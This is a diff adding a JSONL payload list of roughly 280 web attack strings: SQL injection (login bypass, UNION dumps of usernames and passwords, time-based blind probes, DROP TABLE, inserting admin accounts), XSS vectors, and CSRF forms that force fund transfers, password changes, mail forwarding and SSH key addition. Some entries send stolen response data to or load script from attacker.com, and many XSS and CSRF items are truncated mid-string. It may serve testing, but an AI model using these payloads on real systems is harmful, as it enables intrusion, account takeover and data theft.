@@ -1,0 +1,499 @@
+{"id": "sqli-001", "payload": "' OR '1'='1"}
+{"id": "sqli-002", "payload": "' UNION SELECT username, password FROM users--"}
+{"id": "sqli-003", "payload": "'; WAITFOR DELAY '0:0:5'--"}
+{"id": "sqli-004", "payload": "' AND 1=CONVERT(int,@@version)--"}
+{"id": "sqli-005", "payload": "' AND 1=1--"}
+{"id": "sqli-006", "payload": "'; DROP TABLE users--"}
+{"id": "sqli-007", "payload": "' OR 1=1--"}
+{"id": "sqli-008", "payload": "0x27 OR 0x31=0x31--"}
+{"id": "sqli-009", "payload": "'; SELECT pg_sleep(5)--"}
+{"id": "sqli-010", "payload": "' AND 1=CONVERT(int,USER())--"}
+{"id": "sqli-011", "payload": "' AND SUBSTRING(@@version,1,1)='5'--"}
+{"id": "sqli-012", "payload": "' OR 'a'='a"}
+{"id": "sqli-013", "payload": "' OR 1=1-- -"}
+{"id": "sqli-014", "payload": "'//OR//1=1--"}
+{"id": "sqli-015", "payload": "' OR CAST('a' AS INT)=CAST('a' AS INT)--"}
+{"id": "sqli-016", "payload": "' OR SLEEP(5)--"}
+{"id": "sqli-017", "payload": "' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--"}
+{"id": "sqli-018", "payload": "' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--"}
+{"id": "sqli-019", "payload": "'; SELECT pg_sleep(10)--"}
+{"id": "sqli-020", "payload": "' OR 1=1#"}
+{"id": "sqli-021", "payload": "' OR SLEEP(10)--"}
+{"id": "sqli-022", "payload": "' UNION SELECT NULL, NULL, username, password FROM users--"}
+{"id": "sqli-023", "payload": "' OR 1=1/*"}
+{"id": "sqli-024", "payload": "' AND (SELECT COUNT(*) FROM users) > 0--"}
+{"id": "sqli-025", "payload": "' OR pg_sleep(7)--"}
+{"id": "sqli-026", "payload": "' UNION SELECT database(), NULL--"}
+{"id": "sqli-027", "payload": "'; WAITFOR DELAY '0:0:10'--"}
+{"id": "sqli-028", "payload": "' OR CAST(1 AS INT)=1--"}
+{"id": "sqli-029", "payload": "' OR SUBSTRING(user(),1,1)='r'--"}
+{"id": "sqli-030", "payload": "' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(5))--"}
+{"id": "sqli-031", "payload": "' UNION SELECT table_name, NULL FROM information_schema.tables--"}
+{"id": "sqli-032", "payload": "' OR (SELECT sleep(5))--"}
+{"id": "sqli-033", "payload": "' OR 0x61646d696e=0x61646d696e--"}
+{"id": "sqli-034", "payload": "' OR SLEEP(5)#"}
+{"id": "sqli-035", "payload": "' UNION SELECT user(), NULL--"}
+{"id": "sqli-036", "payload": "' OR pg_sleep(3)--"}
+{"id": "sqli-037", "payload": "'; WAITFOR DELAY '0:0:3'--"}
+{"id": "sqli-038", "payload": "' OR SUBSTRING(@@version,1,1)='5'--"}
+{"id": "sqli-039", "payload": "' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(3))--"}
+{"id": "sqli-040", "payload": "'; INSERT INTO users (username, password) VALUES ('attacker', 'pass')--"}
+{"id": "sqli-041", "payload": "' OR SLEEP(8)/*"}
+{"id": "sqli-042", "payload": "' UNION SELECT table_name, NULL FROM information_schema.tables--"}
+{"id": "sqli-043", "payload": "' OR SUBSTRING(user(),1,1)='a'/*"}
+{"id": "sqli-044", "payload": "'; UPDATE users SET password='hacked' WHERE username='admin'--"}
+{"id": "sqli-045", "payload": "' OR pg_sleep(6)/*"}
+{"id": "sqli-046", "payload": "' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--"}
+{"id": "sqli-047", "payload": "' OR CAST('1' AS INT)=1--"}
+{"id": "sqli-048", "payload": "'; WAITFOR DELAY '0:0:7'/*"}
+{"id": "sqli-049", "payload": "' OR SUBSTRING(@@version,1,1)='8'#"}
+{"id": "sqli-050", "payload": "' UNION SELECT user(), NULL--"}
+{"id": "sqli-051", "payload": "' OR 1=(SELECT COUNT() FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(7))/"}
+{"id": "sqli-052", "payload": "'; DELETE FROM users WHERE username='guest'--"}
+{"id": "sqli-053", "payload": "' OR 0x31=0x31--"}
+{"id": "sqli-054", "payload": "' OR SLEEP(9)#"}
+{"id": "sqli-055", "payload": "' UNION SELECT schema_name, NULL FROM information_schema.schemata--"}
+{"id": "sqli-056", "payload": "' OR pg_sleep(4)#"}
+{"id": "sqli-057", "payload": "' OR CAST(1 AS INT)=1/*"}
+{"id": "sqli-058", "payload": "' OR SUBSTRING(user(),1,1)='b'/*"}
+{"id": "sqli-059", "payload": "' UNION SELECT database(), NULL--"}
+{"id": "sqli-060", "payload": "'; INSERT INTO users (username, password) VALUES ('newuser', 'pass123')--"}
+{"id": "sqli-061", "payload": "'; WAITFOR DELAY '0:0:5'#"}
+{"id": "sqli-062", "payload": "' OR SUBSTRING(@@version,1,1)='9'#"}
+{"id": "sqli-063", "payload": "' UNION SELECT user(), NULL--"}
+{"id": "sqli-064", "payload": "' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(4))#"}
+{"id": "sqli-065", "payload": "'; DROP TABLE sessions--"}
+{"id": "sqli-066", "payload": "' OR 0x41=0x41--"}
+{"id": "sqli-067", "payload": "' OR SLEEP(11)--"}
+{"id": "sqli-068", "payload": "' UNION SELECT schema_name, NULL FROM information_schema.schemata--"}
+{"id": "sqli-069", "payload": "' OR pg_sleep(12)--"}
+{"id": "sqli-070", "payload": "'; UPDATE users SET password='newpass' WHERE username='admin'--"}
+{"id": "sqli-071", "payload": "' OR SLEEP(12)--"}
+{"id": "sqli-072", "payload": "' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='orders'--"}
+{"id": "sqli-073", "payload": "' OR SUBSTRING(user(),1,1)='c'--"}
+{"id": "sqli-074", "payload": "'; INSERT INTO users (username, password, role) VALUES ('admin2', 'pass123', 'admin')--"}
+{"id": "sqli-075", "payload": "' OR pg_sleep(8)--"}
+{"id": "sqli-076", "payload": "' UNION SELECT @@version, NULL--"}
+{"id": "sqli-077", "payload": "' OR CAST('1' AS INT)=1--"}
+{"id": "sqli-078", "payload": "'; WAITFOR DELAY '0:0:8'--"}
+{"id": "sqli-079", "payload": "' OR SUBSTRING(@@version,1,1)='7'--"}
+{"id": "sqli-080", "payload": "' UNION SELECT user(), NULL--"}
+{"id": "sqli-081", "payload": "' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(8))--"}
+{"id": "sqli-082", "payload": "'; DELETE FROM users WHERE username='admin'--"}
+{"id": "sqli-083", "payload": "' OR 0x42=0x42--"}
+{"id": "sqli-084", "payload": "' OR SLEEP(13)--"}
+{"id": "sqli-085", "payload": "' UNION SELECT schema_name, NULL FROM information_schema.schemata--"}
+{"id": "sqli-086", "payload": "' OR pg_sleep(14)--"}
+{"id": "sqli-087", "payload": "' OR CAST(1 AS INT)=1--"}
+{"id": "sqli-088", "payload": "' OR SUBSTRING(user(),1,1)='d'--"}
+{"id": "sqli-089", "payload": "' UNION SELECT database(), NULL--"}
+{"id": "sqli-090", "payload": "'; INSERT INTO users (username, password, role) VALUES ('superadmin', 'pass456', 'admin')--"}
+{"id": "sqli-091", "payload": "'; WAITFOR DELAY '0:0:9'--"}
+{"id": "sqli-092", "payload": "' OR SUBSTRING(@@version,1,1)='6'--"}
+{"id": "sqli-093", "payload": "' UNION SELECT user(), NULL--"}
+{"id": "sqli-094", "payload": "' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(9))--"}
+{"id": "sqli-095", "payload": "'; DROP TABLE sessions--"}
+{"id": "sqli-096", "payload": "' OR 0x43=0x43--"}
+{"id": "sqli-097", "payload": "' OR SLEEP(14)--"}
+{"id": "sqli-098", "payload": "' UNION SELECT schema_name, NULL FROM information_schema.schemata--"}
+{"id": "sqli-099", "payload": "' OR pg_sleep(15)--"}
+{"id": "sqli-100", "payload": "'; UPDATE users SET password='securepass' WHERE username='admin'--"}
+{"id": "xss-001", "payload": "<script>alert('XSS1')</script>"}
+{"id": "xss-002", "payload": "<img src=x onerror=alert('XSS2')>"}
+{"id": "xss-003", "payload": "<script>alert('XSS3')</script>"}
+{"id": "xss-004", "payload": "<a href='javascript:alert(\\"}
+{"id": "xss-005", "payload": "<input autofocus onfocus=alert('XSS5')>"}
+{"id": "xss-006", "payload": "<iframe src='javascript:alert(\\"}
+{"id": "xss-007", "payload": "<svg onload=alert('XSS7')>"}
+{"id": "xss-008", "payload": "<body onload=alert('XSS8')>"}
+{"id": "xss-009", "payload": "<div onclick=alert('XSS9')>Click me</div>"}
+{"id": "xss-010", "payload": "<meta http-equiv='refresh' content='0;url=javascript:alert(\\"}
+{"id": "xss-011", "payload": "<style>body{background:url(\\"}
+{"id": "xss-012", "payload": "%3Cscript%3Ealert('XSS12')%3C/script%3E"}
+{"id": "xss-013", "payload": "<span onmouseover=alert('XSS13')>Hover me</span>"}
+{"id": "xss-014", "payload": "<iframe srcdoc=\\"}
+{"id": "xss-015", "payload": "<object data='javascript:alert(\\"}
+{"id": "xss-016", "payload": "<form onsubmit=alert('XSS16')><input type='submit'></form>"}
+{"id": "xss-017", "payload": "<video src=x onerror=alert('XSS17')></video>"}
+{"id": "xss-018", "payload": "<audio src=x onerror=alert('XSS18')></audio>"}
+{"id": "xss-019", "payload": "<textarea onfocus=alert('XSS19')>Focus me</textarea>"}
+{"id": "xss-020", "payload": "<math href='javascript:alert(\\"}
+{"id": "xss-021", "payload": "<base href=\\"}
+{"id": "xss-022", "payload": "<a href='#' onclick='alert(\\"}
+{"id": "xss-023", "payload": "<meta http-equiv='refresh' content='0;url=javascript:alert(\\"}
+{"id": "xss-024", "payload": "<button onclick='alert(\\"}
+{"id": "xss-025", "payload": "<form onreset=alert('XSS25')><input type='reset'></form>"}
+{"id": "xss-026", "payload": "<marquee onstart=alert('XSS26')>Scrolling text</marquee>"}
+{"id": "xss-027", "payload": "<embed src='javascript:alert(\\"}
+{"id": "xss-028", "payload": "<bgsound src='javascript:alert(\\"}
+{"id": "xss-029", "payload": "<xml onload=alert('XSS29')>"}
+{"id": "xss-030", "payload": "<iframe src='about:blank' onload='alert(\\"}
+{"id": "xss-031", "payload": "<svg><animate attributeName='onbegin' begin='0s' dur='1s' repeatCount='1' fill='freeze' to='alert(1)'/></svg>"}
+{"id": "xss-032", "payload": "<base href=\\"}
+{"id": "xss-033", "payload": "<iframe srcdoc='%3Cscript%3Ealert(33)%3C/script%3E'></iframe>"}
+{"id": "xss-034", "payload": "<div onpointerover='alert(\\"}
+{"id": "xss-035", "payload": "<script>alert(XSS35)</script>"}
+{"id": "xss-036", "payload": "<svg><foreignObject><body><script>alert('XSS36')</script></body></foreignObject></svg>"}
+{"id": "xss-037", "payload": "<div style='animation-name:x' onanimationstart='alert(\\"}
+{"id": "xss-038", "payload": "<input oninput='alert(\\"}
+{"id": "xss-039", "payload": "<script>eval(alert('XSS39'))</script>"}
+{"id": "xss-040", "payload": "<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNDAnKTs8L3NjcmlwdD4='></object>"}
+{"id": "xss-041", "payload": "<span onpointerdown='alert(\\"}
+{"id": "xss-042", "payload": "<math href='javascript:alert(\\"}
+{"id": "xss-043", "payload": "<iframe sandbox='allow-scripts' srcdoc='<script>alert(\\"}
+{"id": "xss-044", "payload": "<video oncanplay='alert(\\"}
+{"id": "xss-045", "payload": "<meta http-equiv='refresh' content='0;url=javascript&#58;alert(\\"}
+{"id": "xss-046", "payload": "<svg><set attributeName='onbegin' to='alert(\\"}
+{"id": "xss-047", "payload": "<script>setTimeout('alert(\\"}
+{"id": "xss-048", "payload": "<details ontoggle='alert(\\"}
+{"id": "xss-049", "payload": "<input formaction='javascript:alert(\\"}
+{"id": "xss-050", "payload": "<svg><animateMotion onbegin='alert(\\"}
+{"id": "xss-051", "payload": "<script>setInterval(function(){alert('XSS51')},1000)</script>"}
+{"id": "xss-052", "payload": "<iframe srcdoc='<script>alert(\\"}
+{"id": "xss-053", "payload": "<svg onload='alert(\\"}
+{"id": "xss-054", "payload": "<iframe src='javascript:alert(\\"}
+{"id": "xss-055", "payload": "<object type='text/html' data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNTUnKTs8L3NjcmlwdD4='></object>"}
+{"id": "xss-056", "payload": "<svg onload='setTimeout(function(){alert(\\"}
+{"id": "xss-057", "payload": "<iframe srcdoc=\\"}
+{"id": "xss-058", "payload": "<svg><animateTransform attributeName='onbegin' to='alert(\\"}
+{"id": "xss-059", "payload": "<script>Function('alert(\\"}
+{"id": "xss-060", "payload": "<iframe onload='alert(\\"}
+{"id": "xss-061", "payload": "<svg><filter><feImage xlink:href='javascript:alert(61)' onload='alert(61)'/></filter></svg>"}
+{"id": "xss-062", "payload": "<details ontoggle='alert(\\"}
+{"id": "xss-063", "payload": "<math href='javascript:alert(\\"}
+{"id": "xss-064", "payload": "<audio src='x' onerror='alert(\\"}
+{"id": "xss-065", "payload": "<iframe srcdoc='<script>alert(\\"}
+{"id": "xss-066", "payload": "<svg><animateMotion onbegin='alert(\\"}
+{"id": "xss-067", "payload": "<input oninvalid='alert(\\"}
+{"id": "xss-068", "payload": "<iframe allow='scripts' srcdoc='<script>alert(\\"}
+{"id": "xss-069", "payload": "<svg tabindex='1' onfocusin='alert(\\"}
+{"id": "xss-070", "payload": "<video onpause='alert(\\"}
+{"id": "xss-071", "payload": "<svg onmouseenter='alert(\\"}
+{"id": "xss-072", "payload": "<form oninput='alert(\\"}
+{"id": "xss-073", "payload": "<svg onwheel='alert(\\"}
+{"id": "xss-074", "payload": "<iframe allowfullscreen onload='alert(\\"}
+{"id": "xss-075", "payload": "<svg onanimationend='alert(\\"}
+{"id": "xss-076", "payload": "<audio onplay='alert(\\"}
+{"id": "xss-077", "payload": "<svg onscroll='alert(\\"}
+{"id": "xss-078", "payload": "<iframe seamless onload='alert(\\"}
+{"id": "xss-079", "payload": "<svg oncut='alert(\\"}
+{"id": "xss-080", "payload": "<svg oncopy='alert(\\"}
+{"id": "xss-081", "payload": "<svg onpaste='alert(\\"}
+{"id": "xss-082", "payload": "<svg onreset='alert(\\"}
+{"id": "xss-083", "payload": "<svg onsearch='alert(\\"}
+{"id": "xss-084", "payload": "<svg onselect='alert(\\"}
+{"id": "xss-085", "payload": "<svg onshow='alert(\\"}
+{"id": "xss-086", "payload": "<svg ontoggle='alert(\\"}
+{"id": "xss-087", "payload": "<svg ontransitionend='alert(\\"}
+{"id": "xss-088", "payload": "<svg onunload='alert(\\"}
+{"id": "xss-089", "payload": "<svg onvolumechange='alert(\\"}
+{"id": "xss-090", "payload": "<svg onwaiting='alert(\\"}
+{"id": "xss-091", "payload": "<svg onwheel='alert(\\"}
+{"id": "xss-092", "payload": "<svg onpointercancel='alert(\\"}
+{"id": "xss-093", "payload": "<svg onpointerout='alert(\\"}
+{"id": "xss-094", "payload": "<svg onpointerover='alert(\\"}
+{"id": "xss-095", "payload": "<svg onpointerup='alert(\\"}
+{"id": "xss-096", "payload": "<svg onselectstart='alert(\\"}
+{"id": "xss-097", "payload": "<svg tabindex='0' onshow='alert(\\"}
+{"id": "xss-098", "payload": "<svg onstalled='alert(\\"}
+{"id": "xss-099", "payload": "<svg onsubmit='alert(\\"}
+{"id": "xss-100", "payload": "<svg onunload='alert(\\"}
+{"id": "csrf-001", "payload": "<form action='https://target.com/change-password' method='POST' id='csrfForm'><input type='hidden' name='password' value='hacked123'/></form><script>document.getElementById('csrfForm').submit();</script>"}
+{"id": "csrf-002", "payload": "<img src='https://target.com/delete-account?confirm=yes' style='display:none'/>"}
+{"id": "csrf-003", "payload": "<script>var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/transfer',true);xhr.withCredentials=true;xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.send('amount=1000&to=attacker');</script>"}
+{"id": "csrf-004", "payload": "<script>fetch('https://target.com/update-email',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'email=attacker@example.com'});</script>"}
+{"id": "csrf-005", "payload": "<form action='https://target.com/upload-avatar' method='POST' enctype='multipart/form-data' id='csrfForm'><input type='file' name='avatar' value='malicious.jpg'/></form><script>document.getElementById('csrfForm').submit();</script>"}
+{"id": "csrf-006", "payload": "<meta http-equiv='refresh' content='0;url=https://target.com/subscribe?plan=premium'/>"}
+{"id": "csrf-007", "payload": "<script src='https://attacker.com/csrf-trigger.js'></script>"}
+{"id": "csrf-008", "payload": "<iframe style='display:none' srcdoc=\\"}
+{"id": "csrf-009", "payload": "<svg><script>var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();</script></svg>"}
+{"id": "csrf-010", "payload": "<script>navigator.sendBeacon('https://target.com/track', 'data=malicious');</script>"}
+{"id": "csrf-011", "payload": "<form action='https://target.com/update' method='POST' onsubmit='this.data.value=\\"}
+{"id": "csrf-012", "payload": "<img src='invalid.jpg' onerror=\\"}
+{"id": "csrf-013", "payload": "<form action='https://target.com/transfer' method='POST' id='f'><input type='hidden' name='amount' value='1000'/><input type='hidden' name='to' value='attacker'/></form><script>document.getElementById('f').submit();</script>"}
+{"id": "csrf-014", "payload": "<script>fetch('https://target.com/api/update',{method:'POST',credentials:'include',headers:{'X-CSRF-Token':'fake'},body:'value=1'});</script>"}
+{"id": "csrf-015", "payload": "<form action='https://target.com/upload' method='POST' enctype='multipart/form-data' id='f'><input type='file' name='file'/></form><script>document.getElementById('f').submit();</script>"}
+{"id": "csrf-016", "payload": "<script>setTimeout(function(){fetch('https://target.com/api/delete',{method:'POST',credentials:'include'});},1000);</script>"}
+{"id": "csrf-017", "payload": "<iframe name='hiddenFrame' style='display:none'></iframe><form action='https://target.com/settings' method='POST' target='hiddenFrame' id='f'><input name='setting' value='danger'/></form><script>document.getElementById('f').submit();</script>"}
+{"id": "csrf-018", "payload": "<form action='https://target.com/add-friend' method='GET' id='f'><input name='user' value='attacker'/></form><script>document.getElementById('f').submit();</script>"}
+{"id": "csrf-019", "payload": "<form id='f' action='https://target.com/subscribe' method='POST'><input name='plan' value='premium'/></form><script>document.getElementById('f').submit();</script>"}
+{"id": "csrf-020", "payload": "<script>navigator.sendBeacon('https://target.com/api/track', 'action=subscribe');</script>"}
+{"id": "csrf-021", "payload": "<iframe style='display:none' id='f'></iframe><form action='https://target.com/api/transfer' method='POST' target='f' id='form'><input name='amount' value='9999'/><input name='to' value='attacker'/></form><script>setTimeout(()=>document.getElementById('form').submit(),2000);</script>"}
+{"id": "csrf-022", "payload": "<script>fetch('https://target.com/api/update',{method:'POST',credentials:'include',body:'setting=evil'}).then(r=>r.text()).then(t=>fetch('https://attacker.com/log?data='+encodeURIComponent(t)));</script>"}
+{"id": "csrf-023", "payload": "<form action='https://target.com/api/settings' method='POST' id='f'><input type='hidden' name='mode' value='stealth'/><input type='hidden' name='level' value='admin'/></form><script>document.getElementById('f').submit();</script>"}
+{"id": "csrf-024", "payload": "<img src='https://target.com/api/trigger' onload=\\"}
+{"id": "csrf-025", "payload": "<svg><script>var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();</script></svg>"}
+{"id": "csrf-026", "payload": "<script>navigator.sendBeacon('https://target.com/api/track','action=steal');</script>"}
+{"id": "csrf-027", "payload": "<form action='https://target.com/api/upload' method='POST' enctype='multipart/form-data' id='f'><input type='file' name='file'/></form><script>document.getElementById('f').submit();</script>"}
+{"id": "csrf-028", "payload": "<iframe style='display:none' srcdoc=\\"}
+{"id": "csrf-029", "payload": "<script>setTimeout(()=>fetch('https://target.com/api/step1',{method:'POST',credentials:'include'}),1000);setTimeout(()=>fetch('https://target.com/api/step2',{method:'POST',credentials:'include'}),3000);</script>"}
+{"id": "csrf-030", "payload": "<iframe name='hidden' style='display:none'></iframe><form action='https://target.com/api/settings' method='POST' target='hidden' id='f'><input name='mode' value='stealth'/></form><script>document.getElementById('f').submit();</script>"}
+{"id": "csrf-031", "payload": "<script>fetch('https://target.com/api/update',{method:'POST',credentials:'include',headers:{'X-CSRF-Token':'fake'},body:'data=evil'});</script>"}
+{"id": "csrf-032", "payload": "<form action='https://target.com/api/submit' method='POST' onsubmit='this.data.value=\\"}
+{"id": "csrf-033", "payload": "<img src='invalid.jpg' onerror=\\"}
+{"id": "csrf-034", "payload": "<meta http-equiv='refresh' content='0;url=https://target.com/api/subscribe?plan=premium'/>"}
+{"id": "csrf-035", "payload": "<script>var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();</script>"}
+{"id": "csrf-036", "payload": "<script>fetch('https://target.com/api/json',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'delete'})});</script>"}
+{"id": "csrf-037", "payload": "<form action='https://target.com/api/step1' method='POST' id='f1'><input name='step' value='1'/></form><form action='https://target.com/api/step2' method='POST' id='f2'><input name='step' value='2'/></form><script>document.getElementById('f1').submit();setTimeout(()=>document.getElementById('f2').submit(),2000);</script>"}
+{"id": "csrf-038", "payload": "<iframe style='display:none' srcdoc=\\"}
+{"id": "csrf-039", "payload": "<iframe name='hiddenFrame' style='display:none'></iframe><form action='https://target.com/api/hidden' method='POST' target='hiddenFrame' id='f'><input name='secret' value='data'/></form><script>setTimeout(()=>document.getElementById('f').submit(),1500);</script>"}
+{"id": "csrf-041", "payload": "<script>var img=new Image();img.onload=function(){fetch('https://target.com/api/action',{method:'POST',credentials:'include'});};img.src='https://target.com/api/trigger';</script>"}
+{"id": "csrf-042", "payload": "<form action='https://target.com/api/first' method='POST' id='f1'><input type='hidden' name='step' value='1'/></form><form action='https://target.com/api/second' method='POST' id='f2'><input type='hidden' name='step' value='2'/></form><script>document.getElementById('f1').submit();setTimeout(()=>document.getElementById('f2').submit(),2500);</script>"}
+{"id": "csrf-043", "payload": "<script>fetch('https://target.com/api/custom',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json','X-Requested-With':'XMLHttpRequest'},body:JSON.stringify({cmd:'run'})});</script>"}
+{"id": "csrf-044", "payload": "<form action='https://target.com/api/modify' method='POST' onsubmit='this.token.value=\\"}
+{"id": "csrf-045", "payload": "<img src='nonexistent.jpg' onerror=\\"}
+{"id": "csrf-046", "payload": "<meta http-equiv='refresh' content='0;url=https://target.com/api/subscribe?plan=vip'/>"}
+{"id": "csrf-047", "payload": "<script>setTimeout(()=>{var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();},2000);</script>"}
+{"id": "csrf-048", "payload": "<script>fetch('https://target.com/api/json',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({delete:true})});</script>"}
+{"id": "csrf-049", "payload": "<form action='https://target.com/api/step1' method='POST' id='f1'><input name='step' value='1'/></form><form action='https://target.com/api/step2' method='POST' id='f2'><input name='step' value='2'/></form><script>document.getElementById('f1').submit();setTimeout(()=>document.getElementById('f2').submit(),3000);</script>"}
+{"id": "csrf-050", "payload": "<iframe style='display:none' srcdoc=\\"}
+{"id": "csrf-051", "payload": "<form action='https://example.com/admin/add-user' method='POST' id='f'><input name='username' value='eviladmin'/><input name='role' value='admin'/></form><script>document.getElementById('f').submit();</script>"}
+{"id": "csrf-052", "payload": "<form action='https://mail.example.com/settings/notifications' method='POST' id='f'><input name='email_alerts' value='off'/></form><script>document.getElementById('f').submit();</script>"}
+{"id": "csrf-053", "payload": "<img src='https://secure.example.com/2fa/reset?user=target' style='display:none'/>"}
+{"id": "csrf-054", "payload": "<meta http-equiv='refresh' content='0;url=https://streaming.example.com/subscribe?plan=premium'/>"}
+{"id": "csrf-055", "payload": "<form action='https://shop.example.com/account/address' method='POST' id='f'><input name='address' value='123 Evil St'/></form><script>document.getElementById('f').submit();</script>"}
+{"id": "csrf-056", "payload": "<form action='https://social.example.com/friends/add' method='POST' id='f'><input name='friend_id' value='attacker'/></form><script>document.getElementById('f').submit();</script>"}
+{"id": "csrf-057", "payload": "<form action='https://blog.example.com/comments' method='POST' id='f'><input name='post_id' value='123'/><textarea name='comment'>Hacked by attacker</textarea></form><script>document.getElementById('f').submit();</script>"}
+{"id": "csrf-058", "payload": "<form action='https://social.example.com/profile/picture' method='POST' enctype='multipart/form-data' id='f'><input type='file' name='avatar' value='evil.jpg'/></form><script>document.getElementById('f').submit();</script>"}
+{"id": "csrf-059", "payload": "<form action='https://bank.example.com/transfer' method='POST' id='f'><input name='amount' value='10000'/><input name='to_account' value='attacker'/></form><script>document.getElementById('f').submit();</script>"}
+{"id": "csrf-060", "payload": "<form action='https://security.example.com/settings' method='POST' id='f'><input name='alerts' value='off'/></form><script>document.getElementById('f').submit();</script>"}
+{"id": "csrf-061", "payload": "<form action='https://example.com/account/change-password' method='POST' id='f'><input name='new_password' value='P@ssw0rdHacked'/></form><script>document.getElementById('f').submit();</script>"}
+{"id": "csrf-062", "payload": "<form action='https://ci.example.com/settings/webhooks' method='POST' id='f'><input name='url' value='https://attacker.com/hook'/></form><script>document.getElementById('f').submit();</script>"}
+{"id": "csrf-063", "payload": "<form action='https://calendar.example.com/settings' method='POST' id='f'><input name='timezone' value='UTC+14'/></form><script>document.getElementById('f').submit();</script>"}
+{"id": "csrf-064", "payload": "<form action='https://mail.example.com/settings/forwarding' method='POST' id='f'><input name='forward_to' value='attacker@example.com'/></form><script>document.getElementById('f').submit();</script>"}
+{"id": "csrf-065", "payload": "<form action='https://git.example.com/account/keys' method='POST' id='f'><textarea name='key'>ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA...</textarea></form><script>document.getElementById('f').submit();</script>"}
+{"id": "csrf-066", "payload": "<form action='https://example.com/settings/language' method='POST' id='f'><input name='lang' value='xx-XX'/></form><script>document.getElementById('f').submit();</script>"}
+{"id": "csrf-067", "payload": "<form action='https://newsletter.example.com/subscribe' method='POST' id='f'><input name='email' value='victim@example.com'/></form><script>document.getElementById('f').submit();</script>"}
+{"id": "csrf-068", "payload": "<form action='https://twitter.com/i/tweet/create' method='POST' id='f'><textarea name='tweet'>Hacked by attacker</textarea></form><script>document.getElementById('f').submit();</script>"}
+{"id": "csrf-069", "payload": "<form action='https://sms.example.com/spam/add' method='POST' id='f'><input name='phone' value='+1234567890'/></form><script>document.getElementById('f').submit();</script>"}
+{"id": "csrf-070", "payload": "<form action='https://payments.example.com/account/payment-method' method='POST' id='f'><input name='card_number' value='4111111111111111'/><input name='expiry' value='12/30'/></form><script>document.getElementById('f').submit();</script>"}
+{"id": "csrf-071", "payload": "<form action='https://code.example.com/reviews/settings' method='POST' id='f'><input name='auto_approve' value='true'/></form><script>document.getElementById('f').submit();</script>"}
+{"id": "csrf-072", "payload": "<form action='https://iot.example.com/devices/add' method='POST' id='f'><input name='device_id' value='attacker_device'/></form><script>document.getElementById('f').submit();</script>"}
+{"id": "csrf-073", "payload": "<form action='https://calendar.example.com/events/edit' method='POST' id='f'><input name='event_id' value='123'/><input name='title' value='Hacked Event'/></form><script>document.getElementById('f').submit();</script>"}
+{"id": "csrf-074", "payload": "<form action='https://firewall.example.com/blacklist/add' method='POST' id='f'><input name='ip' value='victim_ip'/></form><script>document.getElementById('f').submit();</script>"}
+{"id": "csrf-075", "payload": "<form action='https://dns.example.com/settings' method='POST' id='f'><input name='dns_server' value='8.8.8.8'/></form><script>document.getElementById('f').submit();</script>"}
+{"id": "csrf-076", "payload": "<form action='https://mailinglist.example.com/subscribe' method='POST' id='f'><input name='email' value='victim@example.com'/></form><script>document.getElementById('f').submit();</script>"}
+{"id": "csrf-077", "payload": "<form action='https://social.example.com/profile/bio' method='POST' id='f'><textarea name='bio'>Hacked by attacker</textarea></form><script>document.getElementById('f').submit();</script>"}
+{"id": "csrf-078", "payload": "<form action='https://sms.example.com/spam/add' method='POST' id='f'><input name='phone' value='+1234567890'/></form><script>document.getElementById('f').submit();</script>"}
+{"id": "csrf-079", "payload": "<form action='https://app.example.com/settings/notifications' method='POST' id='f'><input name='push_notifications' value='off'/></form><script>document.getElementById('f').submit();</script>"}
+{"id": "csrf-080", "payload": "<form action='https://payments.example.com/account/add-card' method='POST' id='f'><input name='card_number' value='4111111111111111'/><input name='expiry' value='12/30'/></form><script>document.getElementById('f').submit();</script>"}
+{"id": "csrf-081", "payload": "<script>var b='PGZvcm0gYWN0aW9uPSdodHRwczovL3RhcmdldC5jb20vYWN0aW9uL3VwZGF0ZScgbWV0aG9kPSdQT1NUJz48aW5wdXQgbmFtZT0nZGF0YScgdmFsdWU9J2V2aWwnPjwvaW5wdXQ+PC9mb3JtPg==';var d=atob(b);var f=document.createElement('div');f.innerHTML=d;document.body.appendChild(f);f.firstChild.submit();</script>"}
